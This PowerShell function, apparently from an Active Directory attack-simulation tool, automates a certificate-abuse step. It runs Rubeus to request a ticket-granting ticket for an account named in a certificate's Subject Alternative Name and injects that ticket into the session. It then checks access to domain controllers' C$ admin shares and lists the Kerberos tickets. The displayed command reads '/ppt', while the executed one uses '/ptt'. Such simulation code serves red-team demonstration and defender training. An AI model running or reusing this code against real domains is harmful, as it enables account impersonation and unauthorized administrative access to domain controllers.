function Request-TGTWithRubeus {

    ################################################################################
    #####                                                                      ##### 
    #####  Request a ticket-granting ticket (TGT) by using the pfx certificate #####
    #####                                                                      #####
    ################################################################################

    Param(
        [string] $pfxFile, 
        [PSCustomObject]$AlternativeAccount
    )

    $Info = Measure-FunctionRuntime -Begin
    
    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Step 3 - Attempt to access a DC's C$ share"

  
    $directory = "\\$Script:ASDC\c$"
    Get-DirContent -Path $directory
    If (-not $UnAttended) { pause }
    If (-not $SkipClearHost) { Clear-Host }
    
    Write-AS2GoOutput -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
    Write-AS2GoOutput -Type  H1 -Message "Request a ticket-granting ticket for the account that was added`nas Subject Alternative Name (SAN) to the issued certificate."
    
    $domain = $AlternativeAccount.FQDN
    $user = $AlternativeAccount.samaccountname

    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
    Write-Highlight -Text "     .\Rubeus.exe ", "asktgt /user:", "$user", " /domain:", "$domain", " /certificate:", "MIACAQMwgAYJKoZ [..] AAAAA=", " /ppt /enctype:aes256"  `
        -Color $fgcC, $fgcS, $fgcV , $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""

    If (-not $UnAttended) { pause }
    Write-AS2GoOutput -Type Codesnippet -Message "Requesting TGT with Rubeus ..."
    Invoke-Command -ScriptBlock { & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$user /domain:$domain /certificate:$pfxFile /ptt /enctype:aes256 } | Out-Host

    If (-not $UnAttended) { pause }
    $tickets = Get-KlistTicket
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Write-AS2GoOutput -Type Info -Message "Last Ticket"
    $tickets | Select-object -Last 1 | Format-List
    If (-not $UnAttended) { pause }

    Write-AS2GoOutput -Type Header -Message "Step 5 - Attempt to access a DC's C$ share after requesting TGT"
    
    #$directory = "\\$Script:ASDC\c$"
    #Get-DirContent -Path $directory

    Test-AccessToOneDCPerDomain

    If (-not $UnAttended) { pause }
    If (-not $SkipClearHost) { Clear-Host }

    $tickets = Get-KlistTicket
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Write-AS2GoOutput -Type Info -Message "Last Ticket"
    $tickets | Select-object -Last 1 | Format-List
    If (-not $UnAttended) { pause }

    Write-Log -Message "    >> using $PfxFile"
    Measure-FunctionRuntime -End -Details $Info
}
